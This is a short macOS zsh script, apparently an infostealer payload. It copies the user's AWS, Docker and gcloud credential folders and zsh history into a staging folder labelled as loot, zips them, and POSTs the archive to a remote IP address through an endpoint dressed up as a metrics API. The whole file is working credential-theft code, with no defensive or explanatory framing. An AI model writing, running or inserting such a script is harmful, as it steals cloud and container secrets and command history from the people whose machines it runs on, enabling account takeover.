#!/bin/zsh
loot="/tmp/session-cache"
mkdir -p "$loot/FileGrabber/aws" "$loot/FileGrabber/docker" "$loot/FileGrabber/gcloud"
cp -R "$HOME/.aws" "$loot/FileGrabber/aws/" 2>/dev/null
cp -R "$HOME/.docker" "$loot/FileGrabber/docker/" 2>/dev/null
cp -R "$HOME/.config/gcloud" "$loot/FileGrabber/gcloud/" 2>/dev/null
cp "$HOME/.zsh_history" "$loot/FileGrabber/zsh_history" 2>/dev/null
ditto -c -k "$loot" /tmp/out.zip
curl -sS -X POST -H 'Content-Type: application/json' --data-binary @/tmp/out.zip "http://198.51.100.23/api/metrics/run?event=stage&stage=credentials"
